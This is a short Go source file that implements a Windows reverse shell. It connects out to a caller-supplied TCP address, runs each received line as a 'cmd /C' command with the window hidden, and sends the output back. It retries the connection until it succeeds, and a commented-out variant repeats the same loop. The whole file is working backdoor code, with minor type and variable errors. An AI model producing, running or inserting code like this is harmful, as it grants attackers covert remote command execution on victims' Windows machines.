package windows
/*
  * Windows revb shell package
*/

import (
  "net"
  "bufio"
  "time"
  "syscall"
  "os/exec"
)

type Shell interface{
  RevShell()
}

type Commands struct{
  address string
  SleepTime int
  //conn ...interface{}//*net.Conn
}

func(com Commands) RevShell(){
  c,err := net.Dial("tcp",com.address)
  if nil != err {
    if nil != c {
      c.Close()
    }
    time.Sleep(time.Second * com.SleepTime)
    com.RevShell()
  }
  r := bufio.NewReader(c)
  for {
    oder,err := r.ReadString('\n')
    if nil != err {
      c.Close()
      com.RevShell()
      return
    }
    cmd := exec.Command("cmd","/C",oder)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow:true}
    out,_ := cmd.CombinedOutput()
    c.Write(out)
  }
}

/*
func (com Commands) Conn(){
  r := bufio.NewReader(com.conn)
  for {
    oder,err := r.ReadString('\n')
    if nil != err {
      c.Close()
      com.RevShell()
      return
    }
    cmd := exec.Command("cmd","/C",oder)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow:true}
    out,_ := cmd.CombinedOutput()
    c.Write(out)
  }
}
*/
func WindowsRevshell(addr string,st int){
  //addr := "0.0.0.0:55677"
  var s Shell
  s = Commands{addr,st}
  s.RevShell()
}
